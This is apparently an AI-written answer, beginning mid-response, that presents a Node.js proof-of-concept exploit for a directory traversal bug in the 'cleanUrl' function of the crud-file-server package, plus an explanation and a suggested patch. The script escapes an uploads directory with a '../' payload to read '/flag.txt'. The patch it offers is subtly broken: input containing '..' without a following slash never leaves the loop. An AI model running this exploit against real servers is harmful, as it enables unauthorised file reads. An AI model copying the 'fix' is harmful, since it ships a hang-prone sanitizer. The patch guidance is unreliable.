async function exploit() {
  const fs = require('fs');
  const path = require('path');

  // Attempt to load the exported cleanUrl from the installed package.
  let cleanUrl;
  try {
    const crudPackage = require('crud-file-server');
    cleanUrl = crudPackage.cleanUrl || crudPackage.CrudFileServer.prototype.cleanUrl;
  } catch {
    // Fallback: Implement the exact vulnerable logic from the provided commit diff
    cleanUrl = function(url) { 
      url = decodeURIComponent(url);
      while(url.indexOf('..').length > 0) { 
        url = url.replace('..', ''); 
      }
      return url;
    };
  }

  const INTENDED_BASE_DIR = '/var/www/app/public/uploads';
  // Payload engineered to escape the base directory and target /flag.txt
  const TRAVERSAL_PAYLOAD = '../../../../../../flag.txt';

  console.log('[*] Simulating request to vulnerable cleanUrl with traversing path...');

  // The server runs user-supplied paths through cleanUrl before resolving them:
  const sanitizedInput = cleanUrl(TRAVERSAL_PAYLOAD);

  console.log(`[!] Malicious payload: ${TRAVERSAL_PAYLOAD}`);
  console.log(`[!] Output from cleanUrl: "${sanitizedInput}"`);

  // Demonstrate the actual resolved path (how the server constructs the target)
  const resolvedPath = path.resolve(INTENDED_BASE_DIR, sanitizedInput);
  console.log(`[!] Resolved absolute path: ${resolvedPath}`);

  // Attempt to read the target file. 
  // Per instructions: no try/catch wrapping this call. If /flag.txt does not exist,
  // fs.readFileSync will throw an ENOENT exception propagating directly to node.
  const flaggedContent = fs.readFileSync(resolvedPath, 'utf-8');

  console.log('✅ VULNERABILITY CONFIRMED: Server successfully resolved a path outside INTENDED_BASE_DIR and accessed the target file.');
  console.log(flaggedContent);
}
await exploit();
```

### Why This Demonstrates the Vulnerability

1. **Core Logic Flaw**: The vulnerable `cleanUrl` function attempts to strip parent directory traversals (`..`) using:
   ```js
   while(url.indexOf('..').length > 0) { url = url.replace('..', ''); }
   ```
   In JavaScript, `String.prototype.indexOf()` returns a **number** (the index of the match or `-1` if not found). Numbers do not have a `.length` property. Accessing it results in `undefined`. The comparison `undefined > 0` evaluates to `false`. Consequently, the `while` loop condition is **always false**, and the loop never executes. Parent directory references are completely ignored.

2. **Bypass Mechanism**: Because `cleanUrl` returns the unmodified payload containing `../../`, concatenating it to any base directory allows an attacker to traverse upward into the filesystem. In this PoC, we inject `../../../../../../flag.txt`. When the server resolves this against its intended upload or public directory, the traversal escapes the sandbox and points directly to `/flag.txt`.

3. **PoC Behavior**: 
   - The script loads `crud-file-server` (or falls back to the exact vulnerable snippet if the exported API differs by version).
   - It passes a payload containing 6 parent directory sequences into `cleanUrl`.
   - It logs the unsanitized output, proving the loop failed to strip `..`.
   - It uses `path.resolve` to show exactly where the server will attempt to read.
   - It calls `fs.readFileSync()` **without exception handling** as requested. If `/flag.txt` exists in the environment, the flag will be printed and the vulnerability is fully proven. If it does not exist, an unhandled `ENOENT` will propagate immediately, providing visible failure evidence without suppressing the error chain.

### Patch Verification Notes
Developers can verify this fix by updating the condition to correctly check for substring existence:
```js
// Correct implementation
while(url.indexOf('..') >= 0) { 
  url = url.replace(/\.\.\//g, ''); // Use regex to avoid greedy/inefficient string replace
}
```
Testing with the PoC against the patched version should result in `cleanUrl` returning an empty string or stripping traversal sequences entirely, causing `path.resolve()` to safely remain within `INTENDED_BASE_DIR`.

